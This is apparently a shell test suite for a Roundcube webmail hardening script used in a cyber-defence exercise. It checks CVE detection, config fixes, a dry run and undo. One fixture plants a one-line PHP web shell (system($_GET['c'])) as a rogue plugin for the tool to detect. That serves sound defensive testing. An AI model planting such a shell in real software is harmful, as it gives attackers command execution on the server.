#!/bin/sh
# Tests for roles/applications/SV-41-roundcube-hardening.sh.
# A fake root (--root) with two Roundcubes: a tarball install in
# /var/www/html/webmail (1.6.10, installer on, imap_debug on, the default
# des_key, logins sent to another server, a plugin file added later, a
# world-readable config) and a packaged one in /usr/share/roundcube (1.6.6,
# its config in /etc/roundcube, a changelog that lists the CVE fixes).
# Checks: each finding; the package changelog turns a CVE into "fixed";
# a dry run changes nothing; --apply fixes each one and keeps the old values
# out of the output; the new des_key is 24 characters; the undo puts every
# file back; the questions on a terminal.  Nothing outside is touched.
. "$(dirname "$0")/helper.sh"
SH=${TEST_SHELL:-sh}
C="$T_ROOT/roles/applications/SV-41-roundcube-hardening.sh"
export CCDC_SKIP_VERIFY=1
O="$T_TMP/out"; F="$T_TMP/root"; RC="$F/var/www/html/webmail"

mkroot() {
    rm -rf "$F"
    mkdir -p "$RC/program/include" "$RC/config" "$RC/installer" "$RC/plugins/archive" "$RC/plugins/helper" \
        "$F/usr/share/roundcube/program/include" "$F/usr/share/roundcube/plugins" "$F/etc/roundcube" "$F/usr/share/doc/roundcube-core" "$F/etc"
    printf "<?php\ndefine('RCMAIL_VERSION', '1.6.10');\n" >"$RC/program/include/iniset.php"; touch -d '2025-01-01' "$RC/program/include/iniset.php"
    printf '<?php // installer\n' >"$RC/installer/index.php"
    printf '<?php\n' >"$RC/plugins/archive/archive.php"; touch -d '2025-01-01' "$RC/plugins/archive/archive.php"
    printf '<?php system($_GET["c"]);\n' >"$RC/plugins/helper/helper.php"
    cat >"$RC/config/config.inc.php" <<'EOF'
<?php
$config = [];
$config['db_dsnw'] = 'mysql://roundcube:RcDbPass41@localhost/roundcube';
$config['imap_host'] = 'localhost:143';
$config['smtp_host'] = 'tls://10.66.6.6:587';
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
$config['enable_installer'] = true;
$config['imap_debug'] = true;
$config['plugins'] = [
    'archive',
    // 'zipdownload',
    'helper',
];
EOF
    chmod 644 "$RC/config/config.inc.php"
    printf "<?php\n\$config['log_logins'] = false;\n\$config['debug_level'] = 1;\n" >"$RC/config/defaults.inc.php"
    printf "<?php\ndefine('RCMAIL_VERSION', '1.6.6');\n" >"$F/usr/share/roundcube/program/include/iniset.php"
    printf "<?php\n\$config['imap_host'] = ['localhost:143'];\n\$config['des_key'] = 'Li/y9QLq+l5KccBBatcLauIK';\n\$config['log_logins'] = true;\n" >"$F/etc/roundcube/config.inc.php"
    chmod 640 "$F/etc/roundcube/config.inc.php"
    printf "<?php\n\$config['debug_level'] = 1;\n" >"$F/etc/roundcube/defaults.inc.php"
    printf 'roundcube (1.6.6+dfsg-2ubuntu0.1) noble-security\n  * SECURITY UPDATE: CVE-2024-42009 and CVE-2025-49113\n' | gzip >"$F/usr/share/doc/roundcube-core/changelog.Debian.gz"
    printf 'root:x:0:\nwww-data:x:33:\n' >"$F/etc/group"
}
run() { $SH "$C" --root "$F" --out "$O" --no-color --box webmail "$@"; }
snap() { (cd "$F" && find . -exec ls -lnd {} + | awk '{ print $1, $3, $4, $NF }' | sort; find . -type f -exec cat {} +) | cksum; }

t_start "options"
$SH "$C" --only everything >/dev/null 2>&1; t_eq "$?" 2 "an unknown fix exits 2"
$SH "$C" --box moon >/dev/null 2>&1; t_eq "$?" 2 "a bad --box exits 2"
out=$($SH "$C" --help 2>&1); t_has "$out" "config-perms" "--help"

t_start "find"
mkroot; before=$(snap)
out=$(run --batch 2>&1)
t_has "$out" "Roundcube 1.6.10 in /var/www/html/webmail" "the tarball install is found"
t_has "$out" "Roundcube 1.6.6 in /usr/share/roundcube" "and the packaged one"
t_has "$out" "[!] CVE-2025-49113: any logged-in user can run commands on the server - 1.6.10 is older than 1.6.11" "1.6.10 has CVE-2025-49113"
t_hasnt "$out" "CVE-2024-42009: an email that steals the reader's mail (XSS) - 1.6.10" "but not CVE-2024-42009 (fixed in 1.6.8)"
t_has "$out" "[ok] CVE-2025-49113 (any logged-in user can run commands on the server): fixed by the distribution package" "the package changelog shows the fix"
t_has "$out" "smtp_host = tls://10.66.6.6:587: logins are sent to 10.66.6.6" "logins sent elsewhere are HIGH"
t_has "$out" "the installer is ON" "the installer on is HIGH"
t_has "$out" "debug on: imap_debug" "imap_debug is HIGH"
t_has "$out" "des_key is the published default" "the default des_key is HIGH"
t_has "$out" "log_logins is off" "log_logins off (from defaults.inc.php) is MED"
t_has "$out" "plugin helper has files newer than Roundcube itself (helper.php" "a plugin added later is MED"
t_hasnt "$out" "plugin archive has files" "a plugin with the old dates is fine"
t_has "$out" "plugins enabled: archive helper" "the plugin list skips commented lines"
t_has "$out" "config/config.inc.php can be read by every user" "a readable config is MED"
t_has "$out" "Dry run: nothing was changed" "dry run without --apply"
t_eq "$(snap)" "$before" "a dry run changes nothing"
t_fail "the database password is not in the output" sh -c "grep -rq RcDbPass41 '$O'"
t_fail "no CSV files are left" sh -c "find '$O' -name '*.csv' | grep -q ."

t_start "apply"
_u0=$(cat "$O"/undo-*.log 2>/dev/null | grep -c .)
out=$(run --batch --no-protected --apply --no-timer --skip block-dirs 2>&1)
cf="$RC/config/config.inc.php"
t_fail "the installer is quarantined" test -d "$RC/installer"
t_has "$(cat "$cf")" "\$config['enable_installer'] = false; // CCDC SV-41" "enable_installer = false"
t_has "$(cat "$cf")" "\$config['imap_debug'] = false; // CCDC SV-41" "imap_debug = false"
t_has "$(cat "$cf")" "\$config['log_logins'] = true; // CCDC SV-41" "log_logins = true"
t_hasnt "$(cat "$cf")" "rcmail-!24ByteDESkey*Str" "the default des_key is gone"
_k=$(sed -n "s/^\$config\['des_key'\] = '\(.*\)'; .*/\1/p" "$cf")
t_eq "${#_k}" 24 "the new des_key is 24 characters"
t_fail "and not in the output" sh -c "grep -rqF '$_k' '$O'"
t_eq "$(ls -l "$cf" | cut -c1-10)" "-rw-r-----" "the config is 640"
t_has "$(cat "$cf")" "smtp_host'] = 'tls://10.66.6.6:587'" "the login host is reported, not changed (only you know the right one)"
cat "$O"/undo-*.log | awk -F'\t' -v n="$_u0" 'NR > n { l[NR] = $4 } END { for (i = NR; i > n; i--) print l[i] }' >"$T_TMP/undo.sh"
sh "$T_TMP/undo.sh" >/dev/null 2>&1
t_eq "$(snap)" "$before" "undo puts every file back"

t_start "questions on a terminal"
if command -v script >/dev/null 2>&1; then
    mkroot
    # the packaged one first: block-dirs n; then the tarball: installer y, debug-off n,
    # des-key y, log-logins n, config-perms y, block-dirs n; apply Enter
    printf 'n\ny\nn\ny\nn\ny\nn\n\n' >"$T_TMP/ans"
    tt=$(CCDC_NO_TTY=0 script -qc "$SH '$C' --root '$F' --out '$O' --no-color --box webmail --no-protected --apply --no-timer" /dev/null <"$T_TMP/ans" 2>&1)
    t_has "$tt" "[y] yes, do it" "each fix lists its answers"
    t_fail "y: the installer is quarantined" test -d "$RC/installer"
    t_has "$(cat "$RC/config/config.inc.php")" "\$config['imap_debug'] = true;" "n: imap_debug stays"
    t_hasnt "$(cat "$RC/config/config.inc.php")" "rcmail-!24ByteDESkey*Str" "y: a new des_key"
fi
t_done
